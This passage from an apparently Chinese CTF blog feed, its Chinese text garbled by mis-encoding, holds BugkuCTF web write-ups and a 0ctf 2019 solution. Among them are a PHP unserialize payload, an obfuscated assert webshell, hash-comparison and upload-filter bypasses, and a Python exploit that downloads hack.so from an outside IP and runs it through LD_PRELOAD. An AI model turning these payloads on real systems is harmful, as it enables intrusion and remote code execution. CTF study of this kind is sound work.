class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
<p>æ˜¾ç„¶è¿™é‡Œä¸è®©æˆ‘ä»¬å†fileä¸­è¾“å…¥flagæ–‡ä»¶åã€‚ä½†æ˜¯Flagç±»åœ¨æ„é€ å¯¹è±¡çš„æ—¶å€™ä¼šæ‰§è¡Œæ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ—¶å€™<br>
æœ‰æœºä¼šechoå‡ºæˆ‘ä»¬è¦çš„æ–‡ä»¶ã€‚ä½†æ˜¯è¦æ€ä¹ˆåˆ©ç”¨passwordæ¥ä¼ å…¥æˆ‘ä»¬è¦çš„å¯¹è±¡å‘¢ï¼Ÿçœ‹åˆ°äº†unseializeååºåˆ—å‡½æ•°<br>
è¿™ä¸ªå‡½æ•°å¯ä»¥æŠŠå¯¹è±¡ä»åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå‡ºå¯¹è±¡æ¥.åœ¨PHPä¸­,åºåˆ—åŒ–ç”¨äºå­˜å‚¨æˆ–ä¼ é€’<em>PHP çš„å€¼</em>çš„è¿‡ç¨‹ä¸­,åŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„</p>
<p>æ‰€ä»¥æˆ‘ä»¬ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $file=<span class="string">'flag.php'</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºO:4:â€œFlagâ€:1:{s:4:â€œfileâ€;s:8:â€œflag.phpâ€;}</p>
<p>äºæ˜¯ä¼ å…¥å‚æ•°index.php?txt=welcome to the bugkuctf&amp;file=hint.php&amp;password=O:4:â€œFlagâ€:1:{s:4:â€œfileâ€;s:8:â€œflag.phpâ€;}</p>
<p>å¾—åˆ°flag</p>
<h2 id="è¿‡ç‹—ä¸€å¥è¯">è¿‡ç‹—ä¸€å¥è¯</h2>
<p>åˆšå¼€å§‹ç»™æˆ‘ä»¬çš„phpä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>;</span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);</span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹æ„æ€explodeå°±æ˜¯æ ¹æ®ç¬¬ä¸€å‚æ•°çš„è§„åˆ™å°†ç›®æ ‡åˆ’åˆ†ä¸ºä¸€ä¸ªæ•°ç»„ã€‚é‚£ä¹ˆpro2å°±æ˜¯assertçš„æ„æ€<br>
assertï¼ˆï¼‰ä¸€ä¸ªä¸œè¥¿ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¼šè¢«å½“åšä»£ç æ‰§è¡Œï¼Œå¦åˆ™æ˜¯false</p>
<p>ä»¥ä¸‹è§£æ³•<br>
è¯•æ¢ä¸€ä¸‹ï¼š?index.php?s=phpinfo();//å¯ä»¥æ­£å¸¸æ‰§è¡Œ<br>
?index.php?s=print_r(scandir(./)) //./çš„æ„æ€åº”è¯¥æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œscanæ‰«æç›®å½•æ–‡ä»¶è¿”å›ä¸€ä¸ªæ•°ç»„</p>
<pre><code>æ˜¾ç¤ºäº†flagæ‰€å¤„çš„txtæ–‡ä»¶å¤¹ï¼Œä¹‹åç”¨var_dump()æˆ–è€…show_source()æˆ–è€…ç›´æ¥è®¿é—®éƒ½å¯ä»¥
</code></pre>
<h2 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ">å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</h2>
<p>æ‰“å¼€ç½‘é¡µï¼Œè¦æ±‚åŒ¹é…çš„æ­£åˆ™å¼å­å¦‚ä¸‹ï¼š</p>
<pre><code>  /key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i
</code></pre>
<ul>
<li>
<p>/ã€‚ã€‚ã€‚ã€‚/è¿™å¯¹ä¸œè¥¿æ ‡å¿—æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´å’Œç»“å°¾ï¼Œç±»ä¼¼çš„è¿˜æœ‰#ã€‚ã€‚ã€‚#ç­‰</p>
</li>
<li>
<p>[[:punct:]] ï¼šåŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼›</p>
</li>
<li>
<p>/i  ï¼šè¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼›<br>
ä¸€å¼€å§‹æˆ‘å†™çš„åŒ¹é…å¯¹è±¡æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code>http://123.206.87.240:8002/web10/?id=keykey00000key://keyb.
</code></pre>
</li>
</ul>
<p>ä½†æ˜¯å¤±è´¥åŸå› æ˜¯åœ¨æœ€åä¸¤ä¸ªæ–œæ ä¸Šï¼Œä»–ä»¬åœ¨urlè¾“å…¥çš„æ—¶å€™å‰ä¸€ä¸ªä¼šå……å½“è½¬ä¹‰ä½œç”¨ï¼Œå®é™…è¾“å…¥çš„åªæœ‰ä¸€ä¸ª/<br>
å˜æˆè¿™æ ·å°±å¥½äº†ï¼š</p>
<pre><code>  http://123.206.87.240:8002/web10/?id=keykey00000key:///keyb.
</code></pre>
<h2 id="å‰å¥³å‹">å‰å¥³å‹</h2>
<p>æ‰“å¼€æºä»£ç ï¼Œå‘ç°åœ¨é“¾æ¥å¤„æœ‰ä¸ªé“¾æ¥ï¼Œç‚¹è¿›å…¥æ˜¯phpä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯¹äºè¿™é‡Œçš„md5ï¼Œæ—¢å¯ä»¥é‡‡ç”¨md5ç¢°æ’çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è®©ä¸¤ä¸ªå˜é‡éƒ½åœ¨è¾“å…¥çš„æ—¶å€™å£°æ˜ä¸ºæ•°ç»„å¾—åˆ°false=false<br>
ï¼Œå¯¹äºè¿™é‡Œçš„strcmpå¯ä»¥è¯•è¯•æŠŠv3å£°æ˜ä¸ºä¸€ä¸ªä¸ç¬¦åˆæ•°æ®ç±»å‹çš„ä¸œè¥¿æ¯”å¦‚è¯´æ•´æ•°ï¼Œè¿™æ ·å¯ä»¥è®©å‡½æ•°è¿”å›0(ä»…å¯¹php5.3ä¹‹å‰ç‰ˆæœ¬æœ‰æ•ˆ)</p>
<pre><code>http://123.206.31.85:49162/index.php?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1

æˆ–è€…

http://123.206.31.85:49162/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=1
</code></pre>
<h2 id="login1">login1</h2>
<p>æ‰“å¼€ä¹‹åæ˜¯ç™»é™†ç•Œé¢ï¼Œæç¤ºè¯´æ˜¯sqlçº¦æŸæ”»å‡»ï¼Œå…·ä½“åšå®¢æ•™ç¨‹çœ‹è¿™é‡Œ<a href="https://blog.csdn.net/wy_97/article/details/77972375" target="_blank" rel="noopener">sqlçº¦æŸæ”»å‡»</a></p>
<p>æ€»è€Œè¨€ä¹‹ä¸ºäº†åˆ›å»ºä¸€ä¸ªæ–°çš„adminï¼Œæˆ‘ä»¬æ³¨å†Œä»¥ä¸‹è´¦æˆ·ï¼š</p>
<pre><code>usernameï¼šadmin                                            1
passwordï¼š2017zxwlB
</code></pre>
<ul>
<li>
<p>æ³¨å†Œçš„æ—¶å€™ï¼Œä¼šé¦–å…ˆæŸ¥çœ‹æ˜¯å¦æœ‰ç›¸åŒçš„ç”¨æˆ·åï¼Œä½†æ˜¯å› ä¸ºselectæŸ¥è¯¢è¯­å¥å¹¶ä¸å¯¹è¶…å‡ºæœ€å¤§é•¿åº¦é™<br>
åˆ¶çš„æ£€ç´¢å¯¹è±¡è¿›è¡Œå°¾éƒ¨ä¿®å‰ªï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·ååœ¨æ•°æ®åº“ä¸­å¹¶ä¸å­˜åœ¨ã€‚</p>
</li>
<li>
<p>æ—¢ç„¶ä¸å­˜åœ¨ï¼Œå°±ä¼šå‘è¡¨ä¸­æ’å…¥è¿™æ¡æ–°çš„ç”¨æˆ·æ•°æ®ï¼Œä½†æ˜¯ç”±äºè¶…å‡ºäº†varchar()æ‰€è§„å®šçš„é•¿åº¦ï¼Œæ‰€ä»¥<br>
è¶…å‡ºéƒ¨åˆ†ä¼šè¢«æˆªæ–­ï¼Œè¿™æ˜¯ç¬¬ä¸€é‡å¤„ç†ï¼Œæ¥ä¸‹æ¥æ•°æ®åº“ä¼šæŠŠæœ‰æ•ˆå­—ç¬¦åé¢çš„ç©ºæ ¼éƒ½åˆ æ‰ï¼Œè¿™æ˜¯ç¬¬äºŒé‡å¤„ç†<br>
ç”±æ­¤æˆ‘ä»¬æ’å…¥äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œä½¿ç”¨çš„æ˜¯è‡ªå·±çš„å¯†ç å°±å¯ä»¥ç™»é™†</p>
</li>
</ul>
<p>ç™»é™†å°±å¥½äº†ã€‚</p>
<h2 id="ä½ ä»å“ªé‡Œæ¥">ä½ ä»å“ªé‡Œæ¥</h2>
<p>é¢˜ç›®è¯´ ä½ æ˜¯ä»è°·æ­Œæ¥çš„å—ï¼Ÿï¼Œåœ¨burpsuiteä¸­æ·»åŠ referer:<a href="https://www.google.xn--com-3h9d0qu3w1rp" target="_blank" rel="noopener">https://www.google.comå°±å¯ä»¥äº†</a></p>
<h2 id="md5-collision">md5 collision</h2>
<p>ä»å†å²write upä¸­è®°å½•çš„è½¬åŒ–åçš„å€¼ä¸º0çš„md5ç ä¸­é€‰ä¸¤ä¸ªå‡ºæ¥ä½œä¸ºå‚æ•°å°±å¯ä»¥äº†</p>
<h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™">ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2>
<p>è¦æ±‚ä»æœ¬åœ°è®¿é—®ï¼Œåœ¨burpsuiteä¸­æ·»åŠ ä¸€æ¡x-forwarded-for:127.0.0.1å°±å¯ä»¥äº†ï¼</p>
<h2 id="å„ç§ç»•è¿‡">å„ç§ç»•è¿‡</h2>
<p>æ‰“å¼€ç½‘é¡µä¹‹åçœ‹åˆ°çš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>sha1æ˜¯æ•£åˆ—ç®—æ³•å‡½æ•°ï¼Œè¿”å›æ•£åˆ—å€¼ã€‚è¿™é‡Œä¼ å…¥ä¸¤ä¸ªä¸ç¬¦åˆæ•°æ®ç±»å‹çš„æ•°æ®æ¥è®©ä¸¤ä¸ªéƒ½è¿”å›falseå°±å¯ä»¥åšåˆ°ç›¸ç­‰<br>
ï¼Œé‚£ä¹ˆå°±è®©unameå£°æ˜æˆä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”ç”¨hackbarä¼ ä¸€ä¸ªæ•°ç»„ç±»å‹çš„passwdè¿›å»ã€‚id=marginå°±è¡Œäº†ã€‚</p>
<h2 id="web8">web8</h2>
<p>æ‰“å¼€ç½‘ç«™æ˜¾ç¤ºä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);<span class="comment">//è§£ææ‰€æœ‰é€šè¿‡getæ–¹å¼è·å–çš„å˜é‡</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));<span class="comment">//ä»æ‰“å¼€fnæ‰€ä»£è¡¨çš„æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯æ–‡ä»¶æµ</span></span><br><span class="line"><span class="keyword">if</span> ($ac === $f)<span class="comment">//å¼ºç­‰äº</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯çŸ¥æœ‰ä¸¤ç§è§£æ³•ï¼š</p>
<ul>
<li>
<p>è§£æ³•ä¸€ï¼šåˆ©ç”¨php://inputä¼ å…¥fnä¸€ä¸ªå€¼å¹¶è®©ä»–å’Œacç›¸ç­‰(è¿™é‡Œå¾ˆå¥‡æ€ªæˆ‘çš„hackbarä¸èƒ½ç»™php://inputä¼ æ•°æ®ï¼Œä½†æ˜¯burpsuiteåº”è¯¥å¯ä»¥)</p>
</li>
<li>
<p>è§£æ³•äºŒï¼šæ ¹æ®é¢˜ç›®æç¤ºï¼ŒçŒœæµ‹æœ‰flag.txtåœ¨åŒçº§ç›®å½•ä¸‹ï¼Œè®¿é—®ä¹‹çœ‹åˆ°æ–‡ä»¶å†…å®¹æ˜¾ç¤ºflagsï¼Œ<br>
é‚£ä¹ˆè®©ac=flagsï¼Œfn=flag.txtå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p>
</li>
</ul>
<h2 id="ç»†å¿ƒ">ç»†å¿ƒ</h2>
<p>ä½¿ç”¨å¾¡å‰‘è½¯ä»¶æ‰«æç½‘ç«™ï¼Œå‘ç°æœ‰robots.txt,ç‚¹è¿›å»æ˜¾ç¤º</p>
<pre><code>User-agent: *
Disallow: /resusl.php
</code></pre>
<p>è®¿é—®è¿™ä¸ªphpæ–‡ä»¶è¯•è¯•ï¼Œçœ‹åˆ°äº†æ˜¾ç¤ºé‡Œå¤´è­¦å‘Šä¸æ˜¯ç®¡ç†å‘˜ç™»é™†ï¼Œè‡ªå·±çš„ipå·²ç»è¢«è®°å½•ï¼Œç¬¬ä¸€ååº”æ˜¯ä¼ªé€ æœ¬åœ°è®¿é—®</p>
<pre><code>Host: 127.0.0.1
Referer: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>è¿™å‡ ç§æ–¹å¼éƒ½å¯ä»¥åœ¨burpsuiteä¸­è¿›è¡Œä¿®æ”¹æ¥ä¼ªé€ æœ¬åœ°è®¿é—®ã€‚(ä½†æ˜¯é¢˜ç›®çš„è€ƒç‚¹ä¼¼ä¹å¹¶ä¸åœ¨æ­¤)</p>
<p>æ¥ä¸‹æ¥æ˜¾ç¤º</p>
<pre><code>By bugkuctf.

if ($_GET[x]==$password) æ­¤å¤„çœç•¥1wå­—
</code></pre>
<p>è¯•ä¸€è¯•æŠŠxèµ‹å€¼æˆadminè¯•ä¸€è¯•ï¼Ÿåˆšå¼€å§‹é¢˜ç›®çš„æ–‡å­—ä¿¡æ¯å°±è®©æˆ‘ä»¬è¯•è¯•æ„é€ äº†adminï¼Œæœç„¶æœ‰äº†flag</p>
<pre><code>robots.txtæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç½‘ç«™ç®¡ç†è€…å¯ä»¥å£°æ˜è¯¥ç½‘ç«™ä¸­ä¸æƒ³è¢«æœç´¢å¼•æ“è®¿
é—®çš„éƒ¨åˆ†ï¼Œæˆ–è€…æŒ‡å®šæœç´¢å¼•æ“åªæ”¶å½•æŒ‡å®šçš„å†…å®¹ã€‚
å½“ä¸€ä¸ªæœç´¢å¼•æ“ï¼ˆåˆç§°æœç´¢æœºå™¨äººæˆ–èœ˜è››ç¨‹åºï¼‰è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶å™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥
ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢æœºå™¨äººå°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚
</code></pre>
<h2 id="æ±‚getshellï¼ˆæ–‡ä»¶ä¸Šä¼ ç±»å‹ï¼‰">æ±‚getshellï¼ˆæ–‡ä»¶ä¸Šä¼ ç±»å‹ï¼‰</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œè¦æ±‚å‘é€å›¾ç‰‡æ–‡ä»¶è€Œä¸æ˜¯phpæ–‡ä»¶ã€‚çœ‹ç½‘ä¸Šè¯´æ˜¯é»‘åå•è¿‡æ»¤å’Œç±»å‹æ£€æµ‹ï¼Œä½†æ˜¯å¯ä»¥æŠŠ<br>
content-type è¿›è¡Œå¤§å°å†™ç»•è¿‡å’Œç±»å‹ä¿®æ”¹ï¼Œå¹¶ä¸”ä¿®æ”¹phpæ–‡ä»¶çš„åç¼€åï¼Œå¯ä»¥ä¿®æ”¹æˆä»¥ä¸‹å‡ ç§</p>
<pre><code>php2, php3, php4, php5, phps, pht, phtm, phtml
</code></pre>
<p>è¯•äº†ä»¥ä¸Šå‡ ç§ä¹‹åï¼Œphp5å¯ä»¥æ‹¿åˆ°flagã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>0ctf 2019 web Wallbreaker Easy</title>
    <url>/2019/04/22/0ctf-2019-web-Wallbreaker-Easy/</url>
    <content><![CDATA[<h2 id="å‰è¨€ï¼šèœæ˜¯åŸç½ª">å‰è¨€ï¼šèœæ˜¯åŸç½ª</h2>
<p>è¿™é“é¢˜ç›®å‚è€ƒäº†å°è¥¿å¸ˆå‚…ã€ä¸€å¶é£˜é›¶å’Œéƒ­dalaoå­¦é•¿çš„åˆ†äº«,çœŸå®åœ°æ„Ÿè§‰è‡ªå·±çš„èœäº†ã€‚ã€‚ã€‚</p>
<p>åœ¨å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­é‡è§äº†å¾ˆå¤šè¯¡å¼‚çš„é—®é¢˜ï¼Œå…ˆç•™ç€ç¢ç£¨ã€‚</p>
<h2 id="ä¸»è¦æ€è·¯">ä¸»è¦æ€è·¯</h2>
<p>åˆ©ç”¨<code>Imagick()</code>ä¸­ä¼šè§¦å‘<code>phpè§£é‡Šå™¨å‘å¤–å¼€å¯ç³»ç»Ÿè¿›ç¨‹</code>çš„æ–¹æ³•ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯å½“ä¼ å…¥<code>MPEG</code>æ ¼å¼ç±»å‹çš„æ–‡ä»¶æ—¶å€™ï¼Œä¸ºäº†è½¬æ¢æ ¼å¼ä¼šå‘å¤–éƒ¨ç¯å¢ƒè¯·æ±‚å¹¶è§¦å‘<code>ffmpeg</code>çš„è°ƒç”¨ï¼Œä»è€Œå¼€å¯æ–°çš„è¿›ç¨‹ã€‚åœ¨å¼€å¯æ—¶ï¼Œç¯å¢ƒå˜é‡<code>LD_PRELOAD</code>ä¼šé¦–å…ˆåŠ è½½ï¼Œè€Œæˆ‘ä»¬äº‹å…ˆä¼šå°†æˆ‘ä»¬çš„<code>æ¶æ„å…±äº«æ–‡ä»¶hack.soåœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸­æŒ‡å‡ºæ¥</code>ï¼Œå³<code>LD_PRELOAD={DIR}/hack.so</code>ã€‚hack.soå…±äº«æ–‡ä»¶ç”±hack.cæ–‡ä»¶ç¼–è¯‘ï¼Œå…¶ä¸­è°ƒç”¨äº†<code>__attribute__((constructor))</code>ï¼Œè¯¥æ–¹æ³•ä¼šåœ¨å…±äº«æ–‡ä»¶è¢«åŠ è½½çš„æ—¶å€™ç‡å…ˆè¢«æ‰§è¡Œï¼Œè‡³äºæ‰§è¡Œçš„ä»£ç ï¼Œå½“ç„¶å°±æ˜¯<code>/readflag &gt; {dir}/flag</code>å•¦ã€‚ä¸»è¦ä»£ç å¦‚ä¸‹ï¼Œä»£ç å†™æ³•å€Ÿé‰´äº†éƒ­å¤§ä½¬çš„è„šæœ¬ï¼Œè™½ç„¶æ€è·¯ä¸ä¸€æ ·ï¼Œä¸ªäººæ„Ÿè§‰dalaoçš„æ€è·¯æ›´åŠ ç›´æ¥æ˜äº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.63.208:31340/"</span></span><br><span class="line">dir = <span class="string">"/tmp/ef757c06e983a137384378f47607abfa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare?</span></span><br><span class="line"><span class="comment">#the new Imagick('&#123;filename&#125;') beginning with no work,but didnot after replace'''to '"',also disapeared after sovled it</span></span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo 'hello';?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$dir = "&#123;0&#125;";</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));</span></span><br><span class="line"><span class="string">chmod("&#123;0&#125;/hack.so",0777);</span></span><br><span class="line"><span class="string">putenv("LD_PRELOAD=&#123;0&#125;/hack.so");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser.wmv","sssss");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser","");</span></span><br><span class="line"><span class="string">$tocken = new Imagick('&#123;0&#125;/ch4ser.wmv');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents('%s/evil',base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/evil";</span></span><br><span class="line"><span class="string">'''</span>%(dir,base64.b64encode(cmd),dir)</span><br><span class="line"></span><br><span class="line">print(requests.post(url, data=&#123;<span class="string">'backdoor'</span>: payload &#125;).content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"print_r(scandir('%s'));"</span>%dir&#125;).content</span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"echo file_get_contents('%s/ch4ser');"</span>%dir&#125;).content</span><br></pre></td></tr></table></figure>
<p>è„šæœ¬å†™å¾—å¾ˆçƒ‚ï¼Œæ³¨é‡Šéƒ¨åˆ†å¯ä»¥å¿½ç•¥ï¼Œæ˜¯æˆ‘åœ¨å†™çš„è¿‡ç¨‹ä¸­é‡åˆ°çš„å°é—®é¢˜ã€‚</p>
<p>ç„¶åæœåŠ¡å™¨ä¸Šé¢çš„<code>hack.c</code>æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨å‘½ä»¤<code>gcc --share -fPIC hack.c -o hack.so</code>å‘½ä»¤æ¥ç¼–è¯‘å…±äº«æ–‡ä»¶ã€‚åœ¨æœåŠ¡å™¨ç›®å½•ä¸‹é¢å¼€å¯<code>python -m SimpleHTTPServer 80</code>ï¼Œå¹¶è¿è¡Œä¸Šè¿°pythonè„šæœ¬ï¼Œå³å¯çœ‹åˆ°flagã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
<blockquote>
<p>ps:æ¯ä¸ªäººçš„ç›®å½•ä¼šä¸å®šæ—¶è¢«æœåŠ¡å™¨æ¸…ç©º</p>
</blockquote>
]]></content>
      <categories>
        <category>æ— æ³•å½’ç±»çš„ç¥çº§é¢˜ç›®</category>
      </categories>
  </entry>
  <entry>
    <title>javascript-learn</title>
    <url>/2019/11/17/javascript-learn/</url>
    <content><![CDATA[<p>ä¸ä¼šjavascript, åœ¨çœ‹smi1eå¸ˆå‚…å…³äºåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„åšå®¢æ—¶å€™, è¿™å¼ å›¾ç‰‡è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…</p>
<p><img src="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png" alt="image"></p>
